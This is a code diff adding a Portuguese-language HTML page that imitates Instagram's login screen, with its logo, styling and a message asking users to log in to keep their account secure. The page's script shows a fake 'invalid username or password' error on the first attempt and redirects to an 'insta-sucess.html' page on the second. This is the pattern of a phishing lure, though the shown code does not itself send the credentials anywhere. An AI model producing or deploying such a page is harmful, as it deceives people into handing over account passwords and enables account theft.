@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login • Instagram</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #fafafa;
+            color: #262626;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-container {
+            max-width: 350px;
+            width: 100%;
+            padding: 20px;
+            background-color: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            text-align: center;
+            box-sizing: border-box;
+        }
+        .logo {
+            width: 175px;
+            margin-bottom: 0px;
+        }
+        .input-group {
+            margin-bottom: 10px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            font-size: 14px;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            background-color: #fafafa;
+            outline: none;
+            box-sizing: border-box;
+        }
+        .error-message {
+            color: red;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+        .login-button {
+            width: 100%;
+            padding: 10px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #ffffff;
+            background-color: #0095f6;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 10px;
+            box-sizing: border-box;
+        }
+        .login-button:disabled {
+            background-color: #b2dffc;
+            cursor: not-allowed;
+        }
+        .separator {
+            display: flex;
+            align-items: center;
+            color: #8e8e8e;
+            margin: 20px 0;
+        }
+        .separator::before,
+        .separator::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+        }
+        .separator::before {
+            margin-right: 10px;
+        }
+        .separator::after {
+            margin-left: 10px;
+        }
+        .forgot-password {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+        }
+        .signup {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #262626;
+        }
+        .signup a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .login-message {
+            font-size: 15px;
+            color: #2f2f2f;
+            margin: 30px 5px;
+            font-weight: 400;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram Logo" class="logo">
+        <p class="login-message">Efetue login para continuar acessando sua conta com segurança.</p>
+        <form id="loginForm" style="margin-top: 20px;">
+            <div class="input-group">
+                <input type="text" id="username" placeholder="Telefone, nome de usuário ou email" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" placeholder="Senha" required>
+            </div>
+            <p class="error-message" id="errorMessage">Usuário ou senha inválidos.</p>
+            <button type="submit" class="login-button" disabled>Entrar</button>
+        </form>
+        <div class="separator">OU</div>
+        <a href="#" class="forgot-password">Esqueceu a senha?</a>
+        <div class="signup">
+            Não tem uma conta? <a href="#">Cadastre-se</a>
+        </div>
+    </div>
+    <script>
+        let attempt = 0;
+        const loginForm = document.getElementById('loginForm');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const loginButton = document.querySelector('.login-button');
+        const errorMessage = document.getElementById('errorMessage');
+
+        function validateForm() {
+            if (usernameInput.value.trim() && passwordInput.value.trim()) {
+                loginButton.disabled = false;
+            } else {
+                loginButton.disabled = true;
+            }
+        }
+
+        usernameInput.addEventListener('input', validateForm);
+        passwordInput.addEventListener('input', validateForm);
+
+        loginForm.addEventListener('submit', function (e) {
+            e.preventDefault();
+            attempt++;
+            if (attempt === 1) {
+                errorMessage.style.display = 'block';
+            } else {
+                window.location.href = 'insta-sucess.html';
+            }
+        });
+    </script>
+</body>
+</html>
